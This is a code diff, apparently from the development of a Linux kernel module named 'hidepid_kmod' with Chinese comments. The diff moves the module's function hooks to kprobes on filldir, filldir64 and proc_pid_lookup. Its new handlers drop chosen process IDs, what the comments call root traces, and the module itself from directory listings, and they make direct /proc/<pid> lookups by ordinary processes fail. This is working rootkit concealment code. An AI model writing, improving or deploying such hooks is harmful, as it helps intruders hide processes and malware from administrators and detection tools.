@@ -341,7 +341,7 @@ static unsigned long ksym(const char *name) {
     return kln_ptr ? kln_ptr(name) : 0;
 }
 
-static int resolve_memory_symbols(void) {
+static int __maybe_unused resolve_memory_symbols(void) {
     int ret;
 
     ret = ensure_kallsyms();
@@ -591,7 +591,7 @@ static void free_trampoline(void *ptr) {
     hide_warn("cannot resolve trampoline freer, leaking trampoline memory\n");
 }
 
-static int install_hook(struct hook_ctx *h, const char *sym, void *hook_fn) {
+static int __maybe_unused install_hook(struct hook_ctx *h, const char *sym, void *hook_fn) {
     unsigned long addr = ksym(sym);
     int ret;
 
@@ -711,12 +711,6 @@ static bool parse_pid(const char *name, int namlen, pid_t *out) {
 #define PROC_NAME ".pidmap"
 #define MODULE_NAME_STR "hidepid_kmod"
 
-typedef int (*filldir_fn)(struct dir_context *, const char *, int,
-                           loff_t, u64, unsigned int);
-
-static struct hook_ctx h_filldir64;
-static struct hook_ctx h_filldir;
-
 /* ==================== 单向隐藏 ==================== */
 /* 核心原则: 被隐藏的进程不受任何限制, 能看到一切 (包括其他隐藏进程、
  * root 痕迹、模块自身). 只有普通进程才会被过滤.
@@ -759,22 +753,28 @@ static bool should_hide_entry(const char *name, int namlen) {
     return false;
 }
 
-static int hook_filldir64(struct dir_context *ctx, const char *name,
-                           int namlen, loff_t offset, u64 ino,
-                           unsigned int d_type) {
-    if (should_hide_entry(name, namlen))
-        return 0;
-    return ((filldir_fn)h_filldir64.trampoline)(
-        ctx, name, namlen, offset, ino, d_type);
+static void kprobe_skip_return(struct pt_regs *regs, unsigned long ret) {
+    regs->regs[0] = ret;
+    regs->pc = regs->regs[30];
 }
 
-static int hook_filldir(struct dir_context *ctx, const char *name,
-                         int namlen, loff_t offset, u64 ino,
-                         unsigned int d_type) {
-    if (should_hide_entry(name, namlen))
+static int pre_filldir_common(struct pt_regs *regs) {
+    const char *name = (const char *)regs->regs[1];
+    int namlen = (int)regs->regs[2];
+
+    if (!should_hide_entry(name, namlen))
         return 0;
-    return ((filldir_fn)h_filldir.trampoline)(
-        ctx, name, namlen, offset, ino, d_type);
+
+    kprobe_skip_return(regs, 0);
+    return 1;
+}
+
+static int pre_filldir64(struct kprobe *p, struct pt_regs *regs) {
+    return pre_filldir_common(regs);
+}
+
+static int pre_filldir(struct kprobe *p, struct pt_regs *regs) {
+    return pre_filldir_common(regs);
 }
 
 /* ==================== proc_pid_lookup hook ==================== */
@@ -785,30 +785,62 @@ static int hook_filldir(struct dir_context *ctx, const char *name,
  *
  * 单向隐藏: 隐藏进程不受限制, 可以直接访问任何 /proc/<pid>/... */
 
-typedef struct dentry *(*proc_pid_lookup_fn)(struct dentry *, unsigned int);
-
-static struct hook_ctx h_proc_pid_lookup;
-
-static struct dentry *hook_proc_pid_lookup(struct dentry *dentry,
-                                            unsigned int flags) {
+static int pre_proc_pid_lookup(struct kprobe *p, struct pt_regs *regs) {
+    struct dentry *dentry = (struct dentry *)regs->regs[0];
     pid_t pid;
 
     /* 单向隐藏: 隐藏进程不受限制, 可以访问一切 */
     if (is_pid_hidden(current->pid))
-        return ((proc_pid_lookup_fn)h_proc_pid_lookup.trampoline)(dentry, flags);
+        return 0;
 
     /* 普通进程: 阻断直接访问隐藏 PID 的 /proc/<pid>/... */
     if (parse_pid(dentry->d_name.name, dentry->d_name.len, &pid) &&
-        is_pid_hidden(pid))
-        return ERR_PTR(-ENOENT);
+        is_pid_hidden(pid)) {
+        kprobe_skip_return(regs, (unsigned long)ERR_PTR(-ENOENT));
+        return 1;
+    }
 
-    return ((proc_pid_lookup_fn)h_proc_pid_lookup.trampoline)(dentry, flags);
+    return 0;
+}
+
+static struct kprobe kp_filldir64;
+static struct kprobe kp_filldir;
+static struct kprobe kp_proc_pid_lookup;
+static bool kp_filldir64_active;
+static bool kp_filldir_active;
+static bool kp_proc_pid_lookup_active;
+
+static int register_core_kprobe(struct kprobe *kp, const char *symbol,
+                                int (*handler)(struct kprobe *,
+                                               struct pt_regs *),
+                                bool *active) {
+    int ret;
+
+    memset(kp, 0, sizeof(*kp));
+    kp->symbol_name = symbol;
+    kp->pre_handler = handler;
+
+    ret = register_kprobe(kp);
+    if (ret)
+        return ret;
+
+    *active = true;
+    return 0;
 }
 
 static void disable_core_hooks_locked(void) {
-    remove_hook(&h_proc_pid_lookup);
-    remove_hook(&h_filldir);
-    remove_hook(&h_filldir64);
+    if (kp_proc_pid_lookup_active) {
+        unregister_kprobe(&kp_proc_pid_lookup);
+        kp_proc_pid_lookup_active = false;
+    }
+    if (kp_filldir_active) {
+        unregister_kprobe(&kp_filldir);
+        kp_filldir_active = false;
+    }
+    if (kp_filldir64_active) {
+        unregister_kprobe(&kp_filldir64);
+        kp_filldir64_active = false;
+    }
     core_hooks_enabled = false;
 }
 
@@ -821,30 +853,26 @@ static int enable_core_hooks(void) {
         return 0;
     }
 
-    ret = resolve_memory_symbols();
+    ret = register_core_kprobe(&kp_filldir64, "filldir64",
+                               pre_filldir64, &kp_filldir64_active);
     if (ret) {
-        hide_err("cannot resolve required memory permission symbols: %d\n",
-                 ret);
-        goto out;
-    }
-
-    ret = install_hook(&h_filldir64, "filldir64", hook_filldir64);
-    if (ret) {
-        hide_err("cannot hook filldir64: %d\n", ret);
+        hide_err("cannot kprobe filldir64: %d\n", ret);
         goto rollback;
     }
 
-    ret = install_hook(&h_filldir, "filldir", hook_filldir);
+    ret = register_core_kprobe(&kp_filldir, "filldir",
+                               pre_filldir, &kp_filldir_active);
     if (ret)
-        hide_warn("cannot hook filldir (non-fatal): %d\n", ret);
+        hide_warn("cannot kprobe filldir (non-fatal): %d\n", ret);
 
-    ret = install_hook(&h_proc_pid_lookup, "proc_pid_lookup",
-                       hook_proc_pid_lookup);
+    ret = register_core_kprobe(&kp_proc_pid_lookup, "proc_pid_lookup",
+                               pre_proc_pid_lookup,
+                               &kp_proc_pid_lookup_active);
     if (ret) {
-        hide_warn("cannot hook proc_pid_lookup (non-fatal): %d\n", ret);
+        hide_warn("cannot kprobe proc_pid_lookup (non-fatal): %d\n", ret);
         hide_warn("direct /proc/<pid> access will not be blocked\n");
     } else {
-        hide_info("proc_pid_lookup hooked: direct /proc/<pid> blocked\n");
+        hide_info("proc_pid_lookup kprobed: direct /proc/<pid> blocked\n");
     }
 
     core_hooks_enabled = true;
